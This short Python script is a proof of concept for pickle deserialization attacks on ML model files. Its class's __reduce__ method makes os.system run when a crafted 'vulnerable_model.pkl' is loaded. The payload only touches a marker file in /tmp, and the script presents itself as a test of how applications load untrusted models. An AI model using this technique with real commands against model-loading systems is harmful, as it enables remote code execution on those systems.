import os
import pickle
import mlflow.pyfunc


# A class that contains an instruction to execute upon loading/deserialization
class ExploitModel:
    def __reduce__(self):
        # The __reduce__ method tells the pickle module how to reconstruct the object.
        # Returning a callable and arguments forces execution immediately upon unpickling.
        return (os.system, ("touch /tmp/native_success_marker.txt",))


if __name__ == "__main__":
    payload_path = "vulnerable_model.pkl"

    print("[*] Serializing validation payload into a mock model file...")
    with open(payload_path, "wb") as f:
        pickle.dump(ExploitModel(), f)

    print(f"[+] Payload saved locally to {payload_path}")
    print("[*] To test native loading mechanics, we simulate an application loading this file.")

    try:
        # This mirrors an application processing an untrusted model artifact
        with open(payload_path, "rb") as f:
            pickle.load(f)
    except Exception as e:
        pass